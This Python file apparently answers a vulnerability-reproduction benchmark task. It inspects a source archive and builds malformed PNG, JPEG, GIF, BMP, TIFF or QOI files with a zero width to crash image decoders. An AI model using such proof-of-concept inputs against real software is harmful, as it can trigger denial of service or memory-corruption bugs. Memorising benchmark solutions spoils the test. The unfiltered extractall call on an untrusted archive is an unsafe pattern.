import os
import tarfile
import tempfile
import shutil
import struct
import zlib
from collections import defaultdict


def _make_png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    length = struct.pack("!I", len(data))
    crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    crc_bytes = struct.pack("!I", crc)
    return length + chunk_type + data + crc_bytes


def build_minimal_png_zero_width() -> bytes:
    signature = b"\x89PNG\r\n\x1a\n"
    width = 0
    height = 1
    bit_depth = 8
    color_type = 2  # truecolor
    compression = 0
    filter_method = 0
    interlace = 0
    ihdr_data = struct.pack("!IIBBBBB", width, height, bit_depth,
                            color_type, compression, filter_method, interlace)
    ihdr_chunk = _make_png_chunk(b"IHDR", ihdr_data)

    # For width=0, each scanline only has filter byte; height=1 => 1 byte
    row_bytes = 1
    scanlines = b"\x00" * (row_bytes * height)
    compressed = zlib.compress(scanlines)
    idat_chunk = _make_png_chunk(b"IDAT", compressed)

    iend_chunk = _make_png_chunk(b"IEND", b"")
    return signature + ihdr_chunk + idat_chunk + iend_chunk


def patch_png_width_zero(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 33:
        raise ValueError("PNG too small")
    if b[0:8] != b"\x89PNG\r\n\x1a\n":
        raise ValueError("Not PNG signature")
    length = struct.unpack(">I", b[8:12])[0]
    chunk_type = b[12:16]
    if chunk_type != b"IHDR" or length < 8:
        raise ValueError("First chunk not IHDR")
    # Set width to 0, keep height unchanged
    b[16:20] = struct.pack(">I", 0)
    chunk_data = b[16:16 + length]
    crc = zlib.crc32(b"IHDR" + chunk_data) & 0xFFFFFFFF
    crc_offset = 16 + length
    if crc_offset + 4 > len(b):
        raise ValueError("PNG CRC offset out of range")
    b[crc_offset:crc_offset + 4] = struct.pack(">I", crc)
    return bytes(b)


def patch_jpeg_width_zero(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 4 or b[0] != 0xFF or b[1] != 0xD8:
        raise ValueError("Not JPEG")
    i = 2
    length = len(b)
    while i + 1 < length:
        if b[i] != 0xFF:
            i += 1
            continue
        # skip padding 0xFF bytes
        while i < length and b[i] == 0xFF:
            i += 1
        if i >= length:
            break
        marker = b[i]
        i += 1
        # Standalone markers without length
        if marker in (0xD8, 0xD9) or (0xD0 <= marker <= 0xD7) or marker == 0x01:
            continue
        if i + 2 > length:
            break
        seg_len = (b[i] << 8) | b[i + 1]
        if seg_len < 2 or i + seg_len > length:
            break
        if marker in (0xC0, 0xC1, 0xC2, 0xC3,
                      0xC5, 0xC6, 0xC7,
                      0xC9, 0xCA, 0xCB,
                      0xCD, 0xCE, 0xCF):
            # SOF segment
            if seg_len >= 7 and i + 7 <= length:
                # precision at i+2, height at i+3..4, width at i+5..6
                b[i + 5:i + 7] = b"\x00\x00"  # width = 0
                return bytes(b)
        i += seg_len
    raise ValueError("No SOF segment found")


def patch_gif_width_zero(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 10 or b[0:3] != b"GIF":
        raise ValueError("Not GIF")
    # width at offset 6..7 (little-endian)
    b[6:8] = b"\x00\x00"
    return bytes(b)


def patch_bmp_width_zero(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 26 or b[0:2] != b"BM":
        raise ValueError("Not BMP")
    # DIB header width offset 18 (4 bytes LE)
    b[18:22] = struct.pack("<I", 0)
    return bytes(b)


def patch_tiff_width_zero(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 8:
        raise ValueError("TIFF too small")
    endian = b[0:2]
    if endian == b"II":
        fmt = "<"
    elif endian == b"MM":
        fmt = ">"
    else:
        raise ValueError("Not TIFF")
    magic = struct.unpack(fmt + "H", b[2:4])[0]
    if magic != 42:
        raise ValueError("Bad TIFF magic")
    ifd_offset = struct.unpack(fmt + "I", b[4:8])[0]
    if ifd_offset + 2 > len(b):
        raise ValueError("Bad IFD offset")
    num_dir = struct.unpack(fmt + "H", b[ifd_offset:ifd_offset + 2])[0]
    off = ifd_offset + 2
    patched = False
    for i in range(num_dir):
        entry_off = off + 12 * i
        if entry_off + 12 > len(b):
            break
        tag = struct.unpack(fmt + "H", b[entry_off:entry_off + 2])[0]
        type_ = struct.unpack(fmt + "H", b[entry_off + 2:entry_off + 4])[0]
        count = struct.unpack(fmt + "I", b[entry_off + 4:entry_off + 8])[0]
        value_off = entry_off + 8
        if tag == 256 and count == 1 and type_ in (3, 4):
            # ImageWidth
            if type_ == 3:
                # SHORT, occupies 2 bytes inside value field
                if fmt == "<":
                    b[value_off:value_off + 4] = b"\x00\x00\x00\x00"
                else:
                    b[value_off:value_off + 4] = b"\x00\x00\x00\x00"
            else:
                # LONG
                b[value_off:value_off + 4] = struct.pack(fmt + "I", 0)
            patched = True
            break
    if not patched:
        raise ValueError("Width tag not found in TIFF")
    return bytes(b)


def patch_qoi_width_zero(data: bytes) -> bytes:
    b = bytearray(data)
    if len(b) < 14:
        raise ValueError("QOI too small")
    if b[0:4] != b"qoif":
        raise ValueError("Not QOI")
    # width at offset 4..7 (big-endian)
    b[4:8] = b"\x00\x00\x00\x00"
    return bytes(b)


def build_minimal_qoi_zero_width() -> bytes:
    # QOI header: magic 'qoif', width, height (big-endian), channels, colorspace
    width = 0
    height = 1
    channels = 3
    colorspace = 0
    header = b"qoif" + struct.pack(">I", width) + struct.pack(">I", height) + bytes([channels, colorspace])
    # Only end marker, no pixel data (spec requires width*height pixels; width is zero)
    end_marker = b"\x00\x00\x00\x00\x00\x00\x00\x01"
    return header + end_marker


class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(temp_dir)
            except Exception:
                # If extraction fails, still return a generic PNG PoC
                return build_minimal_png_zero_width()

            # Determine project root (handle single top-level directory case)
            root_entries = [os.path.join(temp_dir, e) for e in os.listdir(temp_dir)]
            if len(root_entries) == 1 and os.path.isdir(root_entries[0]):
                project_root = root_entries[0]
            else:
                project_root = temp_dir

            # Scan files to detect likely image format and collect sample files
            samples_by_format = defaultdict(list)
            format_counts = defaultdict(int)
            header_flags = {
                "png": False,
                "jpeg": False,
                "tiff": False,
                "gif": False,
                "bmp": False,
                "qoi": False,
            }

            ext_to_format = {
                ".png": "png",
                ".apng": "png",
                ".jpg": "jpeg",
                ".jpeg": "jpeg",
                ".jpe": "jpeg",
                ".jfif": "jpeg",
                ".tif": "tiff",
                ".tiff": "tiff",
                ".gif": "gif",
                ".bmp": "bmp",
                ".dib": "bmp",
                ".qoi": "qoi",
            }

            for dirpath, _, filenames in os.walk(project_root):
                for name in filenames:
                    p = os.path.join(dirpath, name)
                    lower = name.lower()
                    ext = os.path.splitext(lower)[1]
                    if ext in ext_to_format:
                        fmt = ext_to_format[ext]
                        format_counts[fmt] += 1
                        samples_by_format[fmt].append(p)

                    # Header / library hints
                    if lower in ("png.h", "pngconf.h", "pngpriv.h") or "libpng" in lower:
                        header_flags["png"] = True
                    if lower == "stb_image.h":
                        header_flags["png"] = True
                    if lower == "jpeglib.h" or "libjpeg" in lower:
                        header_flags["jpeg"] = True
                    if lower in ("tiff.h", "tiffio.h") or "libtiff" in lower:
                        header_flags["tiff"] = True
                    if lower == "gif_lib.h" or "giflib" in lower:
                        header_flags["gif"] = True
                    if lower.endswith("bmp.h"):
                        header_flags["bmp"] = True
                    if lower in ("qoi.h", "qoi.c"):
                        header_flags["qoi"] = True

            # Decide preferred format
            preferred_fmt = None
            for fmt in ("qoi", "png", "jpeg", "tiff", "gif", "bmp"):
                if header_flags.get(fmt):
                    preferred_fmt = fmt
                    break

            if preferred_fmt is None:
                if format_counts:
                    preferred_fmt = max(format_counts.items(), key=lambda kv: kv[1])[0]
                else:
                    preferred_fmt = "png"

            # Patch an existing sample if possible; otherwise build minimal
            def smallest_sample_path(fmt: str):
                paths = samples_by_format.get(fmt, [])
                if not paths:
                    return None
                return min(paths, key=lambda p: os.path.getsize(p))

            try:
                if preferred_fmt == "png":
                    sample = smallest_sample_path("png")
                    if sample:
                        data = open(sample, "rb").read()
                        return patch_png_width_zero(data)
                    else:
                        return build_minimal_png_zero_width()
                elif preferred_fmt == "jpeg":
                    sample = smallest_sample_path("jpeg")
                    if sample:
                        data = open(sample, "rb").read()
                        return patch_jpeg_width_zero(data)
                    else:
                        # No JPEG sample; generic PNG as fallback
                        return build_minimal_png_zero_width()
                elif preferred_fmt == "gif":
                    sample = smallest_sample_path("gif")
                    if sample:
                        data = open(sample, "rb").read()
                        return patch_gif_width_zero(data)
                    else:
                        return build_minimal_png_zero_width()
                elif preferred_fmt == "bmp":
                    sample = smallest_sample_path("bmp")
                    if sample:
                        data = open(sample, "rb").read()
                        return patch_bmp_width_zero(data)
                    else:
                        return build_minimal_png_zero_width()
                elif preferred_fmt == "tiff":
                    sample = smallest_sample_path("tiff")
                    if sample:
                        data = open(sample, "rb").read()
                        return patch_tiff_width_zero(data)
                    else:
                        return build_minimal_png_zero_width()
                elif preferred_fmt == "qoi":
                    sample = smallest_sample_path("qoi")
                    if sample:
                        data = open(sample, "rb").read()
                        return patch_qoi_width_zero(data)
                    else:
                        return build_minimal_qoi_zero_width()
                else:
                    # Unknown format: generic PNG
                    return build_minimal_png_zero_width()
            except Exception:
                # Any failure in patching/building: fallback to generic PNG
                return build_minimal_png_zero_width()
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)